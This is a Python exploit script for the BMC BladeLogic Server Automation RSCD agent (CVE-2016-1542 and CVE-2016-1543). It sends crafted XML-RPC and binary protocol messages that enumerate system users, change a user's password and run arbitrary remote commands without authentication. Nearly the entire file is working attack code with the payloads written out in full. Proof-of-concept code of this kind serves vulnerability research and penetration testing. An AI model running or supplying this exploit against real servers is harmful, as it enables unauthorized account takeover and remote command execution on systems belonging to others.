#!/usr/bin/python
# References<
# ERNW: https://github.com/ernw/insinuator-snippets/tree/master/bmc_bladelogic
# https://insinuator.net/2016/03/bmc-bladelogic-cve-2016-1542-and-cve-2016-1543/

import socket
import ssl
import re
import sys
import argparse
import gzip
import StringIO
import struct
import xml.etree.ElementTree as ET

def optParser():
	parser = argparse.ArgumentParser(description="Retrieving system users with BMC BladeLogic Server Automation RSCD agent")
	parser.add_argument("host", help="IP address of a target system")
	parser.add_argument("-p", "--port", type=int, default=4750, help="TCP port (default: 4750)")
	parser.add_argument("-c", "--command", type=str, default="", help="Command to execute (ex:linux: id, windows: cmd /c whoami), only works with TLS protocol")
	parser.add_argument("-t", "--timeout", type=int, default=100, help="Timeout (mainly used for TLS instructions - nexec)")
	parser.add_argument("-v", "--verbose", action='store_true', help="Verbose")
	parser.add_argument("--action", type=str, default="", help="Actions: enum_users, change_pwd, exec (need --command)")
	opts=parser.parse_args()
	return opts

### Data ###
# TLSRPC
init = """<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>RemoteServer.intro</methodName><params><param><value>2015-11-19-16-10-30-3920958</value></param><param><value>7</value></param><param><value>0;0;21;AArverManagement_XXX_XXX:XXXXXXXX;2;CM;-;-;0;-;1;1;6;SYSTEM;CP1252;</value></param><param><value>8.6.01.66</value></param></params></methodCall>"""
getVersion="""<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>RemoteServer.getVersion</methodName><params/></methodCall>"""
getUsers="""<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>DAAL.getAssetChildrenStream</methodName><params><param><value><struct><member><name>typeName</name><value>BMC_UnixUsers</value></member><member><name>host</name><value>0.0.0.0</value></member><member><name>container</name><value><array><data><value><struct><member><name>string</name><value>IS_LIVE</value></member><member><name>value</name><value><struct><member><name>longValue</name><value><ex:i8>1</ex:i8></value></member><member><name>kind</name><value><i4>1</i4></value></member></struct></value></member></struct></value></data></array></value></member><member><name>path</name><value>/</value></member></struct></value></param><param><value><i4>1</i4></value></param><param><value><array><data/></array></value></param><param><value><array><data/></array></value></param><param><value><array><data/></array></value></param></params></methodCall>"""
getNext="""<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>DAAL.assetStreamGetNext</methodName><params><param><value><struct><member><name>streamID</name><value><struct><member><name>sessionId</name><value><i4>2</i4></value></member></struct></value></member></struct></value></param><param><value><i4>100</i4></value></param></params></methodCall>"""
closeAsset="""<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>DAAL.assetStreamClose</methodName><params><param><value><struct><member><name>streamID</name><value><struct><member><name>sessionId</name><value><i4>2</i4></value></member></struct></value></member></struct></value></param></params></methodCall>"""
hostOverview="""<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>RemoteServer.getHostOverview</methodName></methodCall>"""
tlsrpc_msg_change_pwd="""<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>DAAL.performAction</methodName><params><param><value><struct><member><name>typeName</name><value>BMC_UnixUser</value></member><member><name>host</name><value>0.0.0.0</value></member><member><name>container</name><value><array><data><value><struct><member><name>string</name><value>IS_LIVE</value></member><member><name>value</name><value><struct><member><name>longValue</name><value><ex:i8>1</ex:i8></value></member><member><name>kind</name><value><i4>1</i4></value></member></struct></value></member></struct></value></data></array></value></member><member><name>path</name><value>/%s</value></member></struct></value></param><param><value>updatePassword</value></param><param><value><array><data><value><struct><member><name>string</name><value>newPassword</value></member><member><name>value</name><value><struct><member><name>stringValue</name><value>%s</value></member><member><name>kind</name><value><i4>2</i4></value></member></struct></value></member></struct></value></data></array></value></param><param><value><boolean>0</boolean></value></param></params></methodCall>"""
# Binary
binary_msg_intro="000000560000001165;0;35;880;880;0000000350;0;7;XXXXXXX;9;agentinfo;-;-;0;-;1;1;7;XXXXXXX;UTF-8" # hello
binary_msg_fingerprint="0000002a0000001064;0;2;6f7;880;0000000024100000000" # server info
binary_msg_nexec="000000520000001165;0;31;da4;da4;0000000310;0;7;XXXXXXX;5;nexec;-;-;0;-;1;1;7;XXXXXXX;UTF-8" # nexec

# Parse arguments
options=optParser()
PORT=options.port
HOST=options.host
COMMAND=options.command
TIMEOUT=options.timeout
VERBOSE=options.verbose
ACTION=options.action

### Generic functions ###
def read_gzip(payload):
    compressedFile = StringIO.StringIO()
    compressedFile.write(payload)
    compressedFile.seek(0)
    decompressedFile = gzip.GzipFile(fileobj=compressedFile, mode='rb')
    return decompressedFile.read()

def generic_create_socket(host, port):
    print "[*] Create socket and connect to %s:%d " % (host, port)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    return sock

def generic_wrap_socket(socket, protocol):
    print "[*] Wrap socket using '%s' protocol" % (protocol)
    socket.sendall(protocol)
    return ssl.wrap_socket(socket, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_TLSv1, ciphers=None)

def generic_identify_OS(msg):
    if "WindowsNT" in msg:
        print "\n[*] Host is most likely a Windows host"
        return "Win"
    elif "Linux" in msg:
        print "\n[*] Host is most likely a Linux host"
        return "Lin"
    else:
        print "\n[*] Failed to identify remote host"
        print msg
        return "KO"

### TLSRPC functions ###
def tlsrpc_use(socket):
    print "\n[*] TLSRPC - Sending intro..."
    tlsrpc_send_HTTP(socket, HOST, PORT, init)
    print "[*] TLSRPC - Response from server...\n"
    tlsrpc_rcv_data(socket)

    print "[*] TLSRPC - Getting version..."
    tlsrpc_send_HTTP(socket, HOST, PORT, getVersion)
    print "[*] TLSRPC - Response from server..."
    tlsrpc_parse_version(tlsrpc_rcv_data(socket))

    print "[*] TLSRPC - Getting Host Overview..."
    tlsrpc_send_HTTP(socket, HOST, PORT, hostOverview)
    print "[*] TLSRPC - Response from server..."
    data = tlsrpc_rcv_data(socket)
    if VERBOSE:
        print "[*] Verbose"
        print data
    generic_identify_OS(data)

def tlsrpc_send_HTTP(socket, HOST, PORT, payload):
    data = """POST /xmlrpc HTTP/1.1
    Host: %s:%d
    User-Agent: Pown
    Content-Type: text/xml
    Content-Length: %d\r\n
    %s""" % (HOST, PORT, len(payload), payload)
    socket.send(data)

def tlsrpc_find_size_recv(payload):
    m = re.search('Content-length: (.+?)$', payload)
    if m:
        return int(m.group(1))
    else:
        return 0

def tlsrpc_rcv_data(socket):
    # get response from server
    response = socket.recv(1024)
    headers, data = response.split("\r\n\r\n")
    # server and recv size
    recv_size_socket = len(data)
    srv_size_socket = tlsrpc_find_size_recv(headers)

    while (recv_size_socket < srv_size_socket):
        try:
            socket.settimeout(1.0)
            data += socket.recv(1024)
            recv_size_socket = len(data)
        except ssl.SSLError:
            break
    return read_gzip(data)

def tlsrpc_parse_version(response):
    rootVersion = ET.fromstring(response)
    print "========================="
    print "Major version: " + rootVersion[0][0][0][0][0][1].text
    print "Minor version: " + rootVersion[0][0][0][0][1][1].text
    print "Patch version: " + rootVersion[0][0][0][0][2][1].text
    print "Platform version: " + rootVersion[0][0][0][0][3][1].text
    print "=========================\n"

def tlsrpc_parse_users(response):
    root = ET.fromstring(response)
    count=0
    ind=1
    while ind:
    	try:
    		ind=root[0][0][0][0][0][1][0][0][count][0][0][1][0][2][1].text
    	except IndexError:
    		pass
    		break
    	count+=1

    print "Number of users found: " + str(count) + "\n"

    for i in range(0,count):
    	print "User " + str(i) + ": " + root[0][0][0][0][0][1][0][0][i][0][0][1][0][2][1].text + "\n........................"
    	print "home directory:" + root[0][0][0][0][0][1][0][0][i][0][1][1][0][2][1][0][0][0][0][1][1][0][1][1].text
    	print "uid:" + root[0][0][0][0][0][1][0][0][i][0][1][1][0][2][1][0][0][11][0][1][1][0][1][1][0].text
    	print "gid:" + root[0][0][0][0][0][1][0][0][i][0][1][1][0][2][1][0][0][3][0][1][1][0][1][1][0].text
    	print "primaryGroupName:" + root[0][0][0][0][0][1][0][0][i][0][1][1][0][2][1][0][0][4][0][1][1][0][1][1].text
    	try:
    		print "username:" + root[0][0][0][0][0][1][0][0][i][0][1][1][0][2][1][0][0][2][0][1][1][0][1][1].text
    	except IndexError:
    		pass
    	try:
    		print "shell:" + root[0][0][0][0][0][1][0][0][i][0][1][1][0][2][1][0][0][10][0][1][1][0][1][1].text
    	except IndexError:
    		pass
    	print "........................\n"

def tlsrpc_getUsers(socket):
    print "\n[*] TLSRPC - Getting users..."
    tlsrpc_send_HTTP(socket, HOST, PORT, getUsers)
    print "[*] TLSRPC - Response from server..."
    data = tlsrpc_rcv_data(socket)
    if VERBOSE:
        print data

    tlsrpc_send_HTTP(socket, HOST, PORT, getNext)
    data = tlsrpc_rcv_data(socket)
    tlsrpc_parse_users(data)

def tlsrpc_changePasswd(socket):
    username=""
    newPassword=""
    print "\n[*] TLSRPC - Changing password for user: '%s'" % (username)
    payload = tlsrpc_msg_change_pwd % (username, newPassword)
    tlsrpc_send_HTTP(socket, HOST, PORT, payload)
    data = tlsrpc_rcv_data(socket)
    if VERBOSE:
    	print data

### TLS functions ###
def tls_use(socket):
    print "\n[*] TLS - Send NEXEC instructions"
    tls_binary_send(socket, binary_msg_nexec)
    response = socket.recv(1024)
    if VERBOSE:
        print response

    print "\n[*] TLS - Send fingerprinting instructions"
    tls_binary_send(socket, binary_msg_fingerprint)
    # Help us determine type of server
    response = socket.recv(1024)
    os = generic_identify_OS(response)
    if VERBOSE:
        print response
    return os

def tls_exec(socket, cmd, os):
    if (len(cmd) == 0):
        if (os == "Win"):
            print "\n[*] No command given, default for Windows is \"cmd /c echo %USERDOMAIN%/%USERNAME%\""
            cmd="cmd /c echo %USERDOMAIN%/%USERNAME%"
        elif (os == "Lin"):
            print "\n[*] No command given, default for Linux is \"id\""
            cmd="id"
        else:
            print "\n[*] No command given, can't be sure about host OS! Let's stop here"
            return

    print "\n[*] TLS - Send CMD \"%s\"" % cmd
    tls_binary_send(socket, tls_binary_exec_format(cmd))
    try:
        result_cmd = socket.recv(1024)
        print "[*] TLS- Result cmd: %s" % result_cmd
    except ssl.SSLError:
        print "[*] TLS - Operation timed out"

def tls_binary_send(socket, message):
    data = struct.pack(">I", len(message)) + message
    socket.sendall(data)

def tls_binary_exec_format(cmd):
    payload="00000010b7;0;2;cae;da4;%s%s" % ('{:09x}'.format(len(cmd)), cmd)
    binary_msg_cmd="%s%s" % ('{:08x}'.format(len(payload)), payload)
    return binary_msg_cmd

### MAIN ###
socket = generic_create_socket(HOST, PORT)
print "[*] Timeout for sockets: %d" % (TIMEOUT)

if (ACTION == "enum_users"):
    wrappedSocket = generic_wrap_socket(socket, "TLSRPC")
    tlsrpc_use(wrappedSocket)
    tlsrpc_getUsers(wrappedSocket)
elif (ACTION == "change_pwd"):
    wrappedSocket = generic_wrap_socket(socket, "TLSRPC")
    tlsrpc_use(wrappedSocket)
    tlsrpc_changePasswd(wrappedSocket)
elif (ACTION == "exec"):
    wrappedSocket = generic_wrap_socket(socket, "TLS")
    wrappedSocket.settimeout(TIMEOUT)
    os = tls_use(wrappedSocket)
    tls_exec(wrappedSocket, COMMAND, os)
else:
    print "[*] Action (--action) unknown"
    wrappedSocket = generic_wrap_socket(socket, "TLSRPC")
    tlsrpc_use(wrappedSocket)

print "[*] Exiting..."
sys.exit(0)
